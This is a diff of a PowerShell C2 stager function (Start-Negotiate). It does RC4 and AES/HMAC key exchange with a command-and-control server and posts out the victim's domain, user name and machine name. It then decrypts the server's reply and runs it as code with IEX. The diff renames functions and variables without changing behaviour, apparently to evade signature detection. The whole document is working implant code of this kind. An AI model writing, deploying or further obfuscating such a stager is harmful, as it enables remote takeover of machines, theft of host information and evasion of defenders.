@@ -12,59 +12,59 @@ $force=0;
 function Start-Negotiate {
     param($s,$SK,$UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',$hop)
 
-    function ConvertTo-RC4ByteStream {
-        Param ($RCK, $In)
-        begin {
-            [Byte[]] $Str = 0..255;
-            $J = 0;
-            0..255 | ForEach-Object {
-                $J = ($J + $Str[$_] + $RCK[$_ % $RCK.Length]) % 256;
-                $Str[$_], $Str[$J] = $Str[$J], $Str[$_];
-            };
-            $I = $J = 0;
-        }
+    function Change-To-Bstream {
+        Param ($mck, $In)
         process {
-            ForEach($Byte in $In) {
-                $I = ($I + 1) % 256;
-                $J = ($J + $Str[$I]) % 256;
-                $Str[$I], $Str[$J] = $Str[$J], $Str[$I];
-                $Byte -bxor $Str[($Str[$I] + $Str[$J]) % 256];
+            ForEach ($Element in $In) {
+                $Idx2 = ($Idx2 + 1) % 256;
+                $Idx1 = ($Idx1 + $Arr[$Idx2]) % 256;
+                $Arr[$Idx2], $Arr[$Idx1] = $Arr[$Idx1], $Arr[$Idx2];
+                $Element -bxor $Arr[($Arr[$Idx2] + $Arr[$Idx1]) % 256];
             }
+        }
+        begin {
+            [Byte[]] $Arr = 0..255;
+            $Idx1 = 0;
+            0..255 | ForEach-Object {
+                $Idx1 = ($Idx1 + $Arr[$_] + $mck[$_ % $mck.Length]) % 256;
+                $Arr[$_], $Arr[$Idx1] = $Arr[$Idx1], $Arr[$_];
+            };
+            $Idx2 = $Idx1 = 0;
         }
     }
 
-    function Decrypt-Bytes {
-        param ($Key, $In)
+    function Read-Things {
+        param ($mk, $In)
         if($In.Length -gt 32) {
-            $HMAC = New-Object System.Security.Cryptography.HMACSHA256;
-            $e=[System.Text.Encoding]::ASCII;
+            $Hsh = New-Object System.Security.Cryptography.HMACSHA256;
+            $Enc = [System.Text.Encoding]::ASCII;
             # Verify the HMAC
-            $Mac = $In[-10..-1];
-            $In = $In[0..($In.length - 11)];
-            $hmac.Key = $e.GetBytes($Key);
-            $Expected = $hmac.ComputeHash($In)[0..9];
-            if (@(Compare-Object $Mac $Expected -Sync 0).Length -ne 0) {
+            $Chk = $In[-10..-1];
+            $Dat = $In[0..($In.length - 11)];
+            $Hsh.Key = $Enc.GetBytes($mk);
+            $Exp = $Hsh.ComputeHash($Dat)[0..9];
+            if (@(Compare-Object $Chk $Exp -Sync 0).Length -ne 0) {
                 return;
             }
-
+        
             # extract the IV
-            $IV = $In[0..15];
-           try {
-                $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
+            $Vec = $Dat[0..15];
+            try {
+                $AesObj = New-Object System.Security.Cryptography.AesCryptoServiceProvider;
             }
             catch {
-                $AES=New-Object System.Security.Cryptography.RijndaelManaged;
+                $AesObj = New-Object System.Security.Cryptography.RijndaelManaged;
             }
-            $AES.Mode = "CBC";
-            $AES.Key = $e.GetBytes($Key);
-            $AES.IV = $IV;
-            ($AES.CreateDecryptor()).TransformFinalBlock(($In[16..$In.length]), 0, $In.Length-16)
-        }
+            $AesObj.Mode = "CBC";
+            $AesObj.Key = $Enc.GetBytes($mk);
+            $AesObj.IV = $Vec;
+            ($AesObj.CreateDecryptor()).TransformFinalBlock(($Dat[16..$Dat.length]), 0, $Dat.Length-16)
+        }               
     }
 
     # make sure the appropriate assemblies are loaded
-    $Null = [Reflection.Assembly]::LoadWithPartialName("System.Security");
-    $Null = [Reflection.Assembly]::LoadWithPartialName("System.Core");
+    $nope = [Reflection.Assembly]::LoadWithPartialName("System.Security");
+    $nope = [Reflection.Assembly]::LoadWithPartialName("System.Core");
 
     # try to ignore all errors
     $ErrorActionPreference = "SilentlyContinue";
@@ -74,16 +74,16 @@ function Start-Negotiate {
     # set up the AES/HMAC crypto
     # $SK -> staging key for this server
     try {
-        $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
+        $sea=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
     }
     catch {
-        $AES=New-Object System.Security.Cryptography.RijndaelManaged;
+        $sea=New-Object System.Security.Cryptography.RijndaelManaged;
     }
     
-    $IV = [byte] 0..255 | Get-Random -count 16;
-    $AES.Mode="CBC";
-    $AES.Key=$SKB;
-    $AES.IV = $IV;
+    $mIV = [byte] 0..255 | Get-Random -count 16;
+    $sea.Mode="CBC";
+    $sea.Key=$SKB;
+    $sea.IV = $mIV;
 
     $hmac = New-Object System.Security.Cryptography.HMACSHA256;
     $hmac.Key = $SKB;
@@ -101,7 +101,7 @@ function Start-Negotiate {
     $ib=$e.getbytes($rk);
 
     # encrypt/HMAC the packet for the c2 server
-    $eb=$IV+$AES.CreateEncryptor().TransformFinalBlock($ib,0,$ib.Length);
+    $eb=$mIV+$sea.CreateEncryptor().TransformFinalBlock($ib,0,$ib.Length);
     $eb=$eb+$hmac.ComputeHash($eb)[0..9];
 
     # if the web client doesn't exist, create a new web client and set appropriate options
@@ -139,10 +139,10 @@ function Start-Negotiate {
     #   meta = STAGE1 (2)
     #   extra = (0x00, 0x00)
     #   length = len($eb)
-    $IV=[BitConverter]::GetBytes($(Get-Random));
+    $mIV=[BitConverter]::GetBytes($(Get-Random));
     $data = $e.getbytes($ID) + @(0x01,0x02,0x00,0x00) + [BitConverter]::GetBytes($eb.Length);
-    $rc4p = ConvertTo-RC4ByteStream -RCK $($IV+$SKB) -In $data;
-    $rc4p = $IV + $rc4p + $eb;
+    $rc4p = Change-To-Bstream -mck $($mIV+$SKB) -In $data;
+    $rc4p = $mIV + $rc4p + $eb;
 
     # step 3 of negotiation -> client posts AESstaging(PublicKey) to the server
     $raw=$talk.UploadData($s+"/{{ stage_1 }}","POST",$rc4p);
@@ -159,15 +159,15 @@ function Start-Negotiate {
 
     # create a new AES object
     try {
-        $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
+        $sea=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
     }
     catch {
-        $AES=New-Object System.Security.Cryptography.RijndaelManaged;
+        $sea=New-Object System.Security.Cryptography.RijndaelManaged;
     }
-    $IV = [byte] 0..255 | Get-Random -Count 16;
-    $AES.Mode="CBC";
-    $AES.Key=$e.GetBytes($key);
-    $AES.IV = $IV;
+    $mIV = [byte] 0..255 | Get-Random -Count 16;
+    $sea.Mode="CBC";
+    $sea.Key=$e.GetBytes($key);
+    $sea.IV = $mIV;
 
     # get some basic system information
     $i=$nonce+'|'+$s+'|'+[Environment]::UserDomainName+'|'+[Environment]::UserName+'|'+[Environment]::MachineName;
@@ -205,7 +205,7 @@ function Start-Negotiate {
 
     # send back the initial system information
     $ib2=$e.getbytes($i);
-    $eb2=$IV+$AES.CreateEncryptor().TransformFinalBlock($ib2,0,$ib2.Length);
+    $eb2=$mIV+$sea.CreateEncryptor().TransformFinalBlock($ib2,0,$ib2.Length);
     $hmac.Key = $e.GetBytes($key);
     $eb2 = $eb2+$hmac.ComputeHash($eb2)[0..9];
 
@@ -215,10 +215,10 @@ function Start-Negotiate {
     #   meta = STAGE2 (3)
     #   extra = (0x00, 0x00)
     #   length = len($eb)
-    $IV2=[BitConverter]::GetBytes($(Get-Random));
+    $mIV2=[BitConverter]::GetBytes($(Get-Random));
     $data2 = $e.getbytes($ID) + @(0x01,0x03,0x00,0x00) + [BitConverter]::GetBytes($eb2.Length);
-    $rc4p2 = ConvertTo-RC4ByteStream -RCK $($IV2+$SKB) -In $data2;
-    $rc4p2 = $IV2 + $rc4p2 + $eb2;
+    $rc4p2 = Change-To-Bstream -mck $($mIV2+$SKB) -In $data2;
+    $rc4p2 = $mIV2 + $rc4p2 + $eb2;
 
     # the User-Agent always resets for multiple calls...silly
     if ($customHeaders -ne "") {
@@ -240,12 +240,12 @@ function Start-Negotiate {
     $raw=$talk.UploadData($s+"/{{ stage_2 }}", "POST", $rc4p2);
 
     # # decrypt the agent and register the agent logic
-    # $data = $e.GetString($(Decrypt-Bytes -Key $key -In $raw));
+    # $data = $e.GetString($(Read-Things -Key $key -In $raw));
     # write-host "data len: $($Data.Length)";
-    IEX $( $e.GetString($(Decrypt-Bytes -Key $key -In $raw)) );
+    IEX $( $e.GetString($(Read-Things -mk $key -In $raw)) );
 
     # clear some variables out of memory and cleanup before execution
-    $AES=$null;$s2=$null;$talk=$null;$eb2=$null;$raw=$null;$IV=$null;$talk=$null;$i=$null;$ib2=$null;
+    $sea=$null;$s2=$null;$talk=$null;$eb2=$null;$raw=$null;$mIV=$null;$i=$null;$ib2=$null;
     [GC]::Collect();
 
     # TODO: remove this shitty $server logic
